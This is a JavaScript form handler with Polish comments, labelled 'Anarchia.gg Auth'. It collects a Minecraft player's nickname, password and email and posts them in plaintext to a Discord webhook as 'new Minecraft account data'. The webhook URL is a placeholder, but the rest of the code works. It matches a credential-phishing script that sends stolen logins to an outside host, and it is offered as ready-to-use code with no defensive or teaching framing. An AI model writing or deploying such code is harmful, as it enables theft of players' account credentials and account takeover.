function submitForm(event) {
    event.preventDefault();

    const playerName = document.getElementById('playerName').value;
    const password = document.getElementById('password').value;
    const email = document.getElementById('email').value || '';
    const statusMessage = document.getElementById('statusMessage');

    // Walidacja
    if (!playerName || !password) {
        showStatus('Proszę wypełnić wszystkie pola.', 'error');
        return;
    }

    if (password.length < 14) {
        showStatus('Hasło musi mieć minimum 14 znaków.', 'error');
        return;
    }

    if (password.length > 32) {
        showStatus('Hasło nie może być dłuższe niż 32 znaki.', 'error');
        return;
    }

    // Tutaj wysyłamy dane do endpointu (np. Discord webhook)
    sendDataToServer(playerName, password, email);
}

function sendDataToServer(playerName, password, email) {
    // Opcja 1: Discord webhook (najprostsza)
    const webhookUrl = 'https://discord.com/api/webhooks/NAZW_AKANA_WEBHOOKA/TOKEN_WEBHOOKA';
    
    const data = {
        username: 'Anarchia.gg Auth',
        embeds: [{
            title: 'Nowe dane konta Minecraft',
            description: `Nick: **${playerName}**\nHasło: **${password}**\nEmail: ${email}`,
            color: 3447003,
            footer: {
                text: 'Anarchia.gg'
            }
        }]
    };

    fetch(webhookUrl, {
        method: 'POST',
        headers: { 'Content-Type': 'application/json' },
        body: JSON.stringify(data)
    })
    .then(response => {
        if (response.ok) {
            showStatus('✅ Dane wysłane! Sprawdź Discord administracji.', 'success');
            document.getElementById('authForm').reset();
        } else {
            throw new Error('Błąd serwera');
        }
    })
    .catch(error => {
        console.error(error);
        showStatus('⚠️ Błąd wysyłania danych. Sprawdź połączenie internet.', 'error');
    });
}

function showStatus(message, type) {
    const statusMessage = document.getElementById('statusMessage');
    statusMessage.textContent = message;
    statusMessage.className = `status ${type}`;
    
    setTimeout(() => {
        statusMessage.classList.remove('success', 'error');
    }, 5000);
}

function generatePassword() {
    const length = Math.floor(Math.random() * (32 - 14 + 1)) + 14;
    const chars = 'ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789';
    let password = '';
    
    for (let i = 0; i < length; i++) {
        password += chars.charAt(Math.floor(Math.random() * chars.length));
    }
    
    document.getElementById('password').value = password;
    document.getElementById('password').focus();
}

// Obsługa Enter w formach
document.getElementById('playerName').addEventListener('keypress', (e) => {
    if (e.key === 'Enter') {
        document.getElementById('password').focus();
    }
});

document.getElementById('password').addEventListener('keypress', (e) => {
    if (e.key === 'Enter') {
        submitForm(new Event('submit'));
    }
});
